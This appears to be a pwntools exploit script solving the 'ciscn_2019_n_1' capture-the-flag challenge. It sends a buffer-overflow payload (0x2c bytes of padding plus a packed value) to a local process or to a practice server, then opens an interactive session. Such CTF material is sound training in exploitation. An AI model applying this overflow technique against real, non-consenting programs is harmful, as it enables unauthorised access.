from pwn import *
import string
context.binary = './ciscn_2019_n_1'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20137)
	libc = ELF('../x64_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./ciscn_2019_n_1')

def dbg():
	raw_input()

payload = 'a'*0x2c + p64(0x41348000)
p.recvline()
p.sendline(payload)
p.interactive()
p.close()